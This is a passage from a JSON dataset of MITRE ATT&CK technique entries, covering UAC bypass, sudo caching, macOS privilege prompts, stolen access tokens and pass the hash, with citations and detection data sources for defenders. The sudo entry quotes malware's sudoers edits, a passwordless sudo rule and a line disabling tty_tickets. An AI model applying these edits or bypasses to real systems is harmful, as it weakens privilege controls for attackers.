        "url": "https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/",
        "description": "Nelson, M. (2017, March 14). Bypassing UAC using App Paths. Retrieved May 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 sdclt bypass",
        "url": "https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/",
        "description": "Nelson, M. (2017, March 17). \"Fileless\" UAC Bypass Using sdclt.exe. Retrieved May 25, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
    "platform": "windows",
    "tid": "T1548.002",
    "technique": "Bypass User Account Control",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)<!-- raw HTML omitted --><!-- raw HTML omitted -->If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of <a href=\"https://attack.mitre.org/techniques/T1218/011\">Rundll32</a> to load a specifically crafted DLL which loads an auto-elevated <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)<!-- raw HTML omitted --><!-- raw HTML omitted -->Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->eventvwr.exe<!-- raw HTML omitted --> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)<!-- raw HTML omitted --><!-- raw HTML omitted -->Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet How UAC Works",
        "url": "https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works",
        "description": "Lich, B. (2016, May 31). How User Account Control Works. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Inside UAC",
        "url": "https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx",
        "description": "Russinovich, M. (2009, July). User Account Control: Inside Windows 7 User Account Control. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN COM Elevation",
        "url": "https://msdn.microsoft.com/en-us/library/ms679687.aspx",
        "description": "Microsoft. (n.d.). The COM Elevation Moniker. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Davidson Windows",
        "url": "http://www.pretentiousname.com/misc/win7_uac_whitelist2.html",
        "description": "Davidson, L. (n.d.). Windows 7 UAC whitelist. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Github UACMe",
        "url": "https://github.com/hfiref0x/UACME",
        "description": "UACME Project. (2016, June 16). UACMe. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 Fileless UAC Bypass",
        "url": "https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/",
        "description": "Nelson, M. (2016, August 15). \"Fileless\" UAC Bypass using eventvwr.exe and Registry Hijacking. Retrieved December 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Fortinet Fareit",
        "url": "https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware",
        "description": "Salvio, J., Joven, R. (2016, December 16). Malicious Macro Bypasses UAC to Elevate Privilege for Fareit Malware. Retrieved December 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "SANS UAC Bypass",
        "url": "http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass",
        "description": "Medin, T. (2013, August 8). PsExec UAC Bypass. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 sdclt app paths",
        "url": "https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/",
        "description": "Nelson, M. (2017, March 14). Bypassing UAC using App Paths. Retrieved May 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 sdclt bypass",
        "url": "https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/",
        "description": "Nelson, M. (2017, March 17). \"Fileless\" UAC Bypass Using sdclt.exe. Retrieved May 25, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0",
    "platform": "linux|macos",
    "tid": "T1548.003",
    "technique": "Sudo and Sudo Caching",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may perform sudo caching and/or use the suoders file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.<!-- raw HTML omitted --><!-- raw HTML omitted -->Within Linux and MacOS systems, sudo (sometimes referred to as “superuser do”) allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <!-- raw HTML omitted -->sudo<!-- raw HTML omitted --> command “allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.”(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <!-- raw HTML omitted -->timestamp_timeout<!-- raw HTML omitted -->, which is the amount of time in minutes between instances of <!-- raw HTML omitted -->sudo<!-- raw HTML omitted --> before it will re-prompt for a password. This is because <!-- raw HTML omitted -->sudo<!-- raw HTML omitted --> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <!-- raw HTML omitted -->/var/db/sudo<!-- raw HTML omitted --> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <!-- raw HTML omitted -->tty_tickets<!-- raw HTML omitted --> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).<!-- raw HTML omitted --><!-- raw HTML omitted -->The sudoers file, <!-- raw HTML omitted -->/etc/sudoers<!-- raw HTML omitted -->, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <!-- raw HTML omitted -->user1 ALL=(ALL) NOPASSWD: ALL<!-- raw HTML omitted --> (Citation: OSX.Dok Malware). Elevated privileges are required to edit this file though.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user’s password. For example, <!-- raw HTML omitted -->/var/db/sudo<!-- raw HTML omitted -->’s timestamp can be monitored to see if it falls within the <!-- raw HTML omitted -->timestamp_timeout<!-- raw HTML omitted --> range. If it does, then malware can execute sudo commands without needing to supply the user’s password. Additional, if <!-- raw HTML omitted -->tty_tickets<!-- raw HTML omitted --> is disabled, adversaries can do this from any tty for that user.<!-- raw HTML omitted --><!-- raw HTML omitted -->In the wild, malware has disabled <!-- raw HTML omitted -->tty_tickets<!-- raw HTML omitted --> to potentially make scripting easier by issuing <!-- raw HTML omitted -->echo 'Defaults !tty_tickets' &gt;&gt; /etc/sudoers<!-- raw HTML omitted --> (Citation: cybereason osx proton). In order for this change to be reflected, the malware also issued <!-- raw HTML omitted -->killall Terminal<!-- raw HTML omitted -->. As of macOS Sierra, the sudoers file has <!-- raw HTML omitted -->tty_tickets<!-- raw HTML omitted --> enabled by default.</p>\n",
    "technique_references": [
      {
        "source_name": "sudo man page 2018",
        "url": "https://www.sudo.ws/",
        "description": "Todd C. Miller. (2018). Sudo Man Page. Retrieved March 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "OSX.Dok Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/",
        "description": "Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "cybereason osx proton",
        "url": "https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does",
        "description": "Amit Serper. (2018, May 10). ProtonB What this Mac Malware Actually Does. Retrieved March 19, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0",
    "platform": "linux|macos",
    "tid": "T1548.003",
    "technique": "Sudo and Sudo Caching",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may perform sudo caching and/or use the suoders file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.<!-- raw HTML omitted --><!-- raw HTML omitted -->Within Linux and MacOS systems, sudo (sometimes referred to as “superuser do”) allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <!-- raw HTML omitted -->sudo<!-- raw HTML omitted --> command “allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.”(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <!-- raw HTML omitted -->timestamp_timeout<!-- raw HTML omitted -->, which is the amount of time in minutes between instances of <!-- raw HTML omitted -->sudo<!-- raw HTML omitted --> before it will re-prompt for a password. This is because <!-- raw HTML omitted -->sudo<!-- raw HTML omitted --> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <!-- raw HTML omitted -->/var/db/sudo<!-- raw HTML omitted --> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <!-- raw HTML omitted -->tty_tickets<!-- raw HTML omitted --> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).<!-- raw HTML omitted --><!-- raw HTML omitted -->The sudoers file, <!-- raw HTML omitted -->/etc/sudoers<!-- raw HTML omitted -->, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <!-- raw HTML omitted -->user1 ALL=(ALL) NOPASSWD: ALL<!-- raw HTML omitted --> (Citation: OSX.Dok Malware). Elevated privileges are required to edit this file though.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user’s password. For example, <!-- raw HTML omitted -->/var/db/sudo<!-- raw HTML omitted -->’s timestamp can be monitored to see if it falls within the <!-- raw HTML omitted -->timestamp_timeout<!-- raw HTML omitted --> range. If it does, then malware can execute sudo commands without needing to supply the user’s password. Additional, if <!-- raw HTML omitted -->tty_tickets<!-- raw HTML omitted --> is disabled, adversaries can do this from any tty for that user.<!-- raw HTML omitted --><!-- raw HTML omitted -->In the wild, malware has disabled <!-- raw HTML omitted -->tty_tickets<!-- raw HTML omitted --> to potentially make scripting easier by issuing <!-- raw HTML omitted -->echo 'Defaults !tty_tickets' &gt;&gt; /etc/sudoers<!-- raw HTML omitted --> (Citation: cybereason osx proton). In order for this change to be reflected, the malware also issued <!-- raw HTML omitted -->killall Terminal<!-- raw HTML omitted -->. As of macOS Sierra, the sudoers file has <!-- raw HTML omitted -->tty_tickets<!-- raw HTML omitted --> enabled by default.</p>\n",
    "technique_references": [
      {
        "source_name": "sudo man page 2018",
        "url": "https://www.sudo.ws/",
        "description": "Todd C. Miller. (2018). Sudo Man Page. Retrieved March 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "OSX.Dok Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/",
        "description": "Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "cybereason osx proton",
        "url": "https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does",
        "description": "Amit Serper. (2018, May 10). ProtonB What this Mac Malware Actually Does. Retrieved March 19, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b84903f0-c7d5-435d-a69e-de47cc3578c0",
    "platform": "macos",
    "tid": "T1548.004",
    "technique": "Elevated Execution with Prompt",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage the <!-- raw HTML omitted -->AuthorizationExecuteWithPrivileges<!-- raw HTML omitted --> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. <!-- raw HTML omitted --><!-- raw HTML omitted -->Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse <!-- raw HTML omitted -->AuthorizationExecuteWithPrivileges<!-- raw HTML omitted --> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it’s all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it’s all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it’s all broken!)</p>\n",
    "technique_references": [
      {
        "source_name": "AppleDocs AuthorizationExecuteWithPrivileges",
        "url": "https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg",
        "description": "Apple. (n.d.). Apple Developer Documentation - AuthorizationExecuteWithPrivileges. Retrieved August 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Death by 1000 installers; it's all broken!",
        "url": "https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8",
        "description": "Patrick Wardle. (2017). Death by 1000 installers; it's all broken!. Retrieved August 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Carbon Black Shlayer Feb 2019",
        "url": "https://www.carbonblack.com/2019/02/12/tau-threat-intelligence-notification-new-macos-malware-variant-of-shlayer-osx-discovered/",
        "description": "Carbon Black Threat Analysis Unit. (2019, February 12). New macOS Malware Variant of Shlayer (OSX) Discovered. Retrieved August 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Coldroot RAT",
        "url": "https://objective-see.com/blog/blog_0x2A.html",
        "description": "Patrick Wardle. (2018, February 17). Tearing Apart the Undetected (OSX)Coldroot RAT. Retrieved August 8, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b84903f0-c7d5-435d-a69e-de47cc3578c0",
    "platform": "macos",
    "tid": "T1548.004",
    "technique": "Elevated Execution with Prompt",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage the <!-- raw HTML omitted -->AuthorizationExecuteWithPrivileges<!-- raw HTML omitted --> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. <!-- raw HTML omitted --><!-- raw HTML omitted -->Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse <!-- raw HTML omitted -->AuthorizationExecuteWithPrivileges<!-- raw HTML omitted --> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it’s all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it’s all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it’s all broken!)</p>\n",
    "technique_references": [
      {
        "source_name": "AppleDocs AuthorizationExecuteWithPrivileges",
        "url": "https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg",
        "description": "Apple. (n.d.). Apple Developer Documentation - AuthorizationExecuteWithPrivileges. Retrieved August 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Death by 1000 installers; it's all broken!",
        "url": "https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8",
        "description": "Patrick Wardle. (2017). Death by 1000 installers; it's all broken!. Retrieved August 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Carbon Black Shlayer Feb 2019",
        "url": "https://www.carbonblack.com/2019/02/12/tau-threat-intelligence-notification-new-macos-malware-variant-of-shlayer-osx-discovered/",
        "description": "Carbon Black Threat Analysis Unit. (2019, February 12). New macOS Malware Variant of Shlayer (OSX) Discovered. Retrieved August 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Coldroot RAT",
        "url": "https://objective-see.com/blog/blog_0x2A.html",
        "description": "Patrick Wardle. (2018, February 17). Tearing Apart the Undetected (OSX)Coldroot RAT. Retrieved August 8, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51",
    "platform": "office-365|saas",
    "tid": "T1550.001",
    "technique": "Application Access Token",
    "tactic": "defense-evasion",
    "datasources": "oauth-audit-logs|office-365-audit-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.<!-- raw HTML omitted --><!-- raw HTML omitted -->Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a “refresh” token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/593.html",
        "description": "none",
        "external_id": "CAPEC-593"
      },
      {
        "source_name": "Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019",
        "url": "https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/",
        "description": "Auth0. (n.d.). Why You Should Always Use Access Tokens to Secure APIs. Retrieved September 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "okta",
        "url": "https://developer.okta.com/blog/2018/06/20/what-happens-if-your-jwt-is-stolen",
        "description": "okta. (n.d.). What Happens If Your JWT Is Stolen?. Retrieved September 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Identity Platform Access 2019",
        "url": "https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens",
        "description": "Cai, S., Flores, J., de Guzman, C., et. al.. (2019, August 27). Microsoft identity platform access tokens. Retrieved October 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Staaldraad Phishing with OAuth 2017",
        "url": "https://staaldraad.github.io/2017/08/02/o356-phishing-with-oauth/",
        "description": "Stalmans, E.. (2017, August 2). Phishing with OAuth and o365/Azure. Retrieved October 4, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51",
    "platform": "office-365|saas",
    "tid": "T1550.001",
    "technique": "Application Access Token",
    "tactic": "lateral-movement",
    "datasources": "oauth-audit-logs|office-365-audit-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.<!-- raw HTML omitted --><!-- raw HTML omitted -->Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a “refresh” token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/593.html",
        "description": "none",
        "external_id": "CAPEC-593"
      },
      {
        "source_name": "Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019",
        "url": "https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/",
        "description": "Auth0. (n.d.). Why You Should Always Use Access Tokens to Secure APIs. Retrieved September 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "okta",
        "url": "https://developer.okta.com/blog/2018/06/20/what-happens-if-your-jwt-is-stolen",
        "description": "okta. (n.d.). What Happens If Your JWT Is Stolen?. Retrieved September 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Identity Platform Access 2019",
        "url": "https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens",
        "description": "Cai, S., Flores, J., de Guzman, C., et. al.. (2019, August 27). Microsoft identity platform access tokens. Retrieved October 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Staaldraad Phishing with OAuth 2017",
        "url": "https://staaldraad.github.io/2017/08/02/o356-phishing-with-oauth/",
        "description": "Stalmans, E.. (2017, August 2). Phishing with OAuth and o365/Azure. Retrieved October 4, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e",
    "platform": "windows",
    "tid": "T1550.002",
    "technique": "Pass the Hash",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user’s cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.<!-- raw HTML omitted --><!-- raw HTML omitted -->Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.(Citation: NSA Spotting)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/644.html",
        "description": "none",
        "external_id": "CAPEC-644"
      },
      {
        "source_name": "NSA Spotting",
        "url": "https://apps.nsa.gov/iaarchive/library/reports/spotting-the-adversary-with-windows-event-log-monitoring.cfm",
        "description": "National Security Agency/Central Security Service Information Assurance Directorate. (2015, August 7). Spotting the Adversary with Windows Event Log Monitoring. Retrieved September 6, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e",
    "platform": "windows",
    "tid": "T1550.002",
    "technique": "Pass the Hash",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user’s cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.<!-- raw HTML omitted --><!-- raw HTML omitted -->Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.(Citation: NSA Spotting)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/644.html",
        "description": "none",
        "external_id": "CAPEC-644"
      },
      {
        "source_name": "NSA Spotting",
        "url": "https://apps.nsa.gov/iaarchive/library/reports/spotting-the-adversary-with-windows-event-log-monitoring.cfm",
        "description": "National Security Agency/Central Security Service Information Assurance Directorate. (2015, August 7). Spotting the Adversary with Windows Event Log Monitoring. Retrieved September 6, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926",
    "platform": "windows",
    "tid": "T1550.003",
    "technique": "Pass the Ticket",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
